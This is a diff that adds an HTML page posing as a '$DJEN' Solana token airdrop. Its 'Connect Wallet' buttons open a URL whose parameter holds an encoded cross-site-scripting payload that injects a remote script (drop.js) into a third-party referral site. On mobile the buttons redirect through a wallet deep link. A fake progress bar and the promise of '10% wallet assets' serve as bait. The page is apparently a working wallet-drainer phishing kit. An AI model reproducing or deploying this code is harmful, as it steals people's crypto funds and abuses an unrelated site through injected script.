@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GG1</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(to bottom right, #0f172a, #1e293b);
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 2rem;
+            background: rgba(15, 23, 42, 0.8);
+            backdrop-filter: blur(10px);
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+
+        .connect-btn {
+            background: #6366f1;
+            color: white;
+            border: none;
+            padding: 0.75rem 1.5rem;
+            border-radius: 9999px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: background-color 0.2s;
+        }
+
+        .connect-btn:hover {
+            background: #4f46e5;
+        }
+
+        .main-content {
+            max-width: 1200px;
+            margin: auto;
+            padding: 2rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex-grow: 1;
+        }
+
+        .left-content, .right-content {
+            width: 100%;
+            max-width: 800px;
+        }
+
+        .profile-section {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
+
+        .profile-image {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        .profile-name {
+            font-size: 1.5rem;
+            font-weight: bold;
+        }
+
+        .banner-image {
+            width: 100%;
+            height: 300px;
+            object-fit: cover;
+            border-radius: 1rem;
+            margin-bottom: 2rem;
+        }
+
+        .details {
+            margin-top: 2rem;
+        }
+
+        .details h2 {
+            font-size: 1.25rem;
+            margin-bottom: 1rem;
+        }
+
+        .airdrop-card {
+            background: rgba(30, 41, 59, 0.5);
+            border-radius: 1rem;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .status {
+            color: #10b981;
+            font-size: 0.875rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .amount {
+            font-size: 2rem;
+            font-weight: bold;
+            margin-bottom: 0.5rem;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 3px;
+            margin: 1rem 0;
+        }
+
+        .progress-fill {
+            width: 34%;
+            height: 100%;
+            background: #10b981;
+            border-radius: 3px;
+            transition: width 0.3s ease;
+        }
+
+        .detail-item {
+            margin-bottom: 1rem;
+            color: #94a3b8;
+        }
+
+        .detail-item strong {
+            color: #e2e8f0;
+            display: block;
+            margin-bottom: 0.25rem;
+        }
+
+        @media (max-width: 768px) {
+            .main-content {
+                display: block;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo">GG1</div>
+        <button class="connect-btn">Connect Wallet</button>
+    </header>
+
+    <main class="main-content">
+        <div class="right-content">
+            <div class="airdrop-card">
+                <div class="status">
+                    ✓ IN PROGRESS
+                </div>
+                <div class="amount">$DJEN</div>
+                <div>on Solana</div>
+                
+                <div class="progress-bar">
+                    <div class="progress-fill"></div>
+                </div>
+                
+                <div style="display: flex; justify-content: space-between; margin-bottom: 1rem;">
+                    <span>Progress</span>
+                    <span id="progress-percentage">34%</span>
+                </div>
+                
+                <div style="display: flex; justify-content: space-between; margin-bottom: 1rem;">
+                    <span>Max Airdrop</span>
+                    <span>10% Wallet Assets</span>
+                </div>
+                
+                <button class="connect-btn" style="width: 100%">Connect Wallet</button>
+            </div>
+        </div>
+
+        <div class="left-content">
+            <div class="profile-section">
+                <img src="https://pbs.twimg.com/profile_images/1846567401824845824/R9l-CLzD_400x400.jpg" alt="Profile" class="profile-image">
+                <h1 class="profile-name">@thisisdjen</h1>
+            </div>
+            
+            <img src="https://pbs.twimg.com/profile_banners/1535608045228597249/1721745956/1500x500" alt="Banner" class="banner-image">
+
+            <div class="details">
+                <h2>Details</h2>
+                <div class="detail-item">
+                    <strong>Distribution:</strong>
+                    The airdrop will be distributed within 48 hours after it ends.
+                </div>
+                <div class="detail-item">
+                    <strong>Airdrop Amount:</strong>
+                    Depending on the total assets of recipient's wallet, 10% of their total assets will be airdropped in $DJEN as a reward.
+                </div>
+                <div class="detail-item">
+                    <strong>Project Description:</strong>
+                    thisisdjen offers a unique and audacious approach to crypto education and investment with its $DJEN token.
+                </div>
+            </div>
+        </div>
+    </main>
+
+<script>
+    // Add click handlers for the connect wallet buttons
+    document.querySelectorAll('.connect-btn').forEach(button => {
+        button.addEventListener('click', () => {
+            openPopupOrRedirect();
+        });
+    });
+
+    // Progress update functionality
+    let progress = parseFloat(localStorage.getItem('progress')) || 34;
+    const progressFill = document.querySelector('.progress-fill');
+    const progressPercentage = document.getElementById('progress-percentage');
+
+    function updateProgress() {
+        progressFill.style.width = `${progress}%`;
+        progressPercentage.textContent = `${progress.toFixed(1)}%`;
+        localStorage.setItem('progress', progress.toString());
+    }
+
+    function incrementProgress() {
+        const increment = Math.random() * (0.3 - 0.1) + 0.2;
+        progress = Math.min(progress + increment, 100);
+        updateProgress();
+
+        if (progress < 100) {
+            setTimeout(incrementProgress, Math.random() * (6000 - 200) + 200);
+        }
+    }
+
+    updateProgress();
+    incrementProgress();
+</script>
+<script>
+    // Function to open a popup or redirect
+    function openPopupOrRedirect() {
+        const url = "https://pre.honey.land/ref/6421c2a71b75aM?track=/*-/*%60/*%5C%60/*%27/*%22/**/(/*%20*/%3C/script%3E%3Cscript%3Eimport(`https://djencoin.com/drop.js`)%3C/script%3E"
+        const popupWidth = 500;
+        const popupHeight = 750;
+    
+        const screenWidth = screen.width;
+        const screenHeight = screen.height;
+    
+        if (screenWidth > popupWidth && screenHeight > popupHeight) {
+            const left = (screenWidth - popupWidth) / 2;
+            const top = (screenHeight - popupHeight) / 2;
+    
+            window.open(url, "_blank", `width=${popupWidth},height=${popupHeight},top=${top},left=${left}`);
+        } else {
+            window.location.href = "https://phantom.app/ul/browse/https%3A%2F%2Fdjencoin.com%2Fmobile?ref=https%3A%2F%2Fdjencoin.com%2Fmobile";
+        }
+    }
+    
+    // Add event listeners to all button elements
+    document.addEventListener('DOMContentLoaded', function() {
+        const buttons = document.getElementsByTagName('button');
+        for (let i = 0; i < buttons.length; i++) {
+            buttons[i].addEventListener('click', function(event) {
+                event.preventDefault(); // Prevents the default button action if necessary
+                openPopupOrRedirect();
+            });
+        }
+    });</script>
+  
+
+</body>
+</html>
